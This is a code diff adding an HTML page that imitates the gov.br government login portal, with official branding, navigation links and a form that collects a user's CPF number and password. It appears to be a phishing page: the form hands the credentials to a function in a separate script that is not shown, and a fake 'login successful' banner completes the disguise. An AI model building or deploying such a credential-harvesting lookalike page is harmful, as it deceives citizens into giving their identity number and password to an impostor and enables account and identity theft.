@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<title>gov.br - Acesse sua conta</title>
+<head>
+<link rel="shortcut icon" href="./recursos/imagens/gov_icon.ico" />
+<link rel="stylesheet" href="./recursos/scripts/css/EstiloPrincipal.css"></link>
+</head>
+<ul>
+<div align='right'>
+<img src="./recursos/imagens/logo.png" width=5% align='left'>
+<a href="default.asp"><b><font color="#d80000">CORONAVÍRUS (Covid-19)</font></b> |</a>
+<a href="news.asp">Acesso à informação |</a>
+<a href="contact.asp">Participe |</a>
+<a href="about.asp">Legislação |</a>
+<a href="about.asp">Educação |</a>
+<a href="about.asp">Órgãos do Governo</a>
+</div>
+</ul>
+<header>
+<div class="info_login_feito">
+  <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+ Login realizado com sucesso.
+</div>
+<div class="info_login_Nfeito">
+  <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+ Erro ao tentar realizar login: veja as informações digitadas ou tente novamente mais tarde.
+</div>
+
+<br><br><br><br><br><br><br><br>
+<form onsubmit="EfetuarLogin(); return false;">
+    <img src="./recursos/imagens/logo.png" id="imagem_logo">
+    <table id="loginForm" align="right">
+	    <tr>
+		<td><h3>Seja bem vindo(a)! Para continuar<br> acesse sua conta gov.br</h3></td>
+		</tr>
+        <tr>
+            <td><input type="text" placeholder="Insira seu CPF" id="cpf_container"/></td>
+        </tr>
+        <tr>
+            <td> <input type="password"/ placeholder="Insira sua senha" id="senha_container"></td>
+        </tr>
+        <tr>
+            <td colspan="2"><input type="submit" value="Avançar"/></td>
+        </tr>
+		<tr>
+		<td><h3 style='text-decoration:underline'>Não possui uma conta?</h3></td>
+		</tr>
+    </table>
+</form>
+
+
+<br><br><br><br><br><br><br><br><br><br><br><br>
+</header>
+<body>
+<br><br>
+<div id='conteudo'>
+<img src="./recursos/imagens/contagov.png" class="esquerdaImagens" align='left'></img>
+<p><h2>◉ Uma conta gov.br garante a identificação de cada <br> cidadão que acessa os serviços digitais do governo. <br> Dúvidas frequentes podem ser acessadas <a href='http://faq-login-unico.servicos.gov.br/en/latest/' style='color: #272766; text-decoration:underline;'>aqui.</a></h2></p>
+<input type="button" value="Crie sua conta gov.br"/ id="criarContaBotao">
+</div>
+<script src='./recursos/scripts/core/Core.js'></script>
+</body>
+<br><br><br><br><br>
+<footer>
+<img src="./recursos/imagens/patria-amada.png"><img src="./recursos/imagens/acesso-informacao.png">
+</footer>
+</html>
